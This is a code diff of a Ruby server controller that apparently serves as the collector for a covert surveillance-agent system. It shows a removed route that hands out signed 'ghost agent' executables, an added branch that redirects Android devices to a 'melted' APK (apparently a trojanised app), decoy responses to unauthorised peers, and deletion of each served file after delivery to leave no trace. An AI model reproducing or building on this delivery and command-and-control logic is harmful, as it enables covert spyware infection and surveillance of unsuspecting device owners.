@@ -14,20 +14,6 @@ module Collector
 class CollectorController < RESTController
   
   def get
-    # search for a ghost request: /gh/build_id/instance_id
-    if /^\/gh\/\d+\/[[:xdigit:]]+$/ =~ @request[:uri]
-      root, gh, build_id, instance_id = @request[:uri].split('/')
-      ghost = DB.instance.ghost_agent(build_id, instance_id)
-      unless ghost.nil?
-        trace :info, "[#{@request[:peer]}] ghost agent available, sending #{ghost.bytesize} bytes"
-
-        # prepend the auth to the exe
-        auth = DB.instance.agent_signature + SecureRandom.random_bytes(16)
-
-        return ok(auth + ghost, {content_type: 'binary/octetstream'})
-      end
-    end
-
     # serve the requested file
     return http_get_file(@request[:headers], @request[:uri])
   rescue Exception => e
@@ -42,7 +28,7 @@ class CollectorController < RESTController
     # only the DB is authorized to send PUSH commands
     unless from_db?(@request[:headers])
       trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUSH [#{@request[:uri]}] commands!!!"
-      return decoy_page
+      return method_not_allowed
     end
 
     # it is a request to push to a NC element
@@ -51,14 +37,10 @@ class CollectorController < RESTController
   end
 
   def put
-    # get the peer ip address if it was forwarded by a proxy
-    peer = http_get_forwarded_peer(@request[:headers])
-    @request[:peer] = peer unless peer.nil?
-
     # only the DB is authorized to send PUT commands
     unless from_db?(@request[:headers])
       trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PUT [#{@request[:uri]}] commands!!!"
-      return decoy_page
+      return method_not_allowed
     end
 
     # this is a request to save a file in the public dir
@@ -69,21 +51,20 @@ class CollectorController < RESTController
     # only the DB is authorized to send DELETE commands
     unless from_db?(@request[:headers])
       trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send DELETE [#{@request[:uri]}] commands!!!"
-      return decoy_page
+      return method_not_allowed
     end
 
     return http_delete_file @request[:uri]
   end
 
   def proxy
-    # every request received are forwarded externally like a proxy
-
     # only the DB is authorized to send PROXY commands
     unless from_db?(@request[:headers])
       trace :warn, "HACK ALERT: #{@request[:peer]} is trying to send PROXY [#{@request[:uri]}] commands!!!"
-      return decoy_page
+      return method_not_allowed
     end
 
+    # every request received are forwarded externally like a proxy
     return proxy_request(@request)
   end
 
@@ -96,13 +77,9 @@ class CollectorController < RESTController
 
   def post
     # the REST protocol for synchronization
-    content, content_type, cookie = Protocol.parse @request[:peer], @request[:uri], @request[:cookie], @request[:content]
-    return decoy_page if content.nil?
+    content, content_type, cookie = Protocol.parse @request[:peer], @request[:uri], @request[:cookie], @request[:content], @request[:anon_version]
+    return bad_request if content.nil?
     return ok(content, {content_type: content_type, cookie: cookie})
-  end
-
-  def bad
-    return bad_request
   end
 
   #
@@ -134,9 +111,17 @@ class CollectorController < RESTController
 
     # if the file is not present
     unless File.file?(file_path)
-      # appent the extension for the arch of the requester
+      # append the extension for the arch of the requester
       arch_specific_file = uri + ext
 
+      # special case for android melted app
+      if os.eql? 'android' and File.exist?(file_path + ".m.apk")
+        arch_specific_file = uri + ".m.apk"
+        trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
+        return http_redirect arch_specific_file
+      end
+
+      # all the other OSes
       if File.file?(file_path + ext)
         trace :info, "[#{@request[:peer]}][#{os}] redirected to: #{arch_specific_file}"
         return http_redirect arch_specific_file
@@ -152,17 +137,17 @@ class CollectorController < RESTController
 
     trace :info, "[#{@request[:peer]}][#{os}] serving #{file_path} (#{File.size(file_path)}) #{content_type}"
 
-    return stream_file(File.realdirpath(file_path))
+    return stream_file(File.realdirpath(file_path), proc {FileUtils.rm_rf(File.realdirpath(file_path))})
   end
 
   def http_redirect(file)
-    body =  "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">"
-    body += "<html><head>"
-    body += "<title>302 Found</title>"
-    body += "</head><body>"
-    body += "<h1>Found</h1>"
-    body += "<p>The document has moved <a href=\"#{file}\">here</a>.</p>"
-    body += "</body></html>"
+    body =  "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n"
+    body += "<html><head>\n"
+    body += "<title>302 Found</title>\n"
+    body += "</head><body>\n"
+    body += "<h1>Found</h1>\n"
+    body += "<p>The document has moved <a href=\"#{file}\">here</a>.</p>\n"
+    body += "</body></html>\n"
     return redirect(body, {location: file})
   end
 
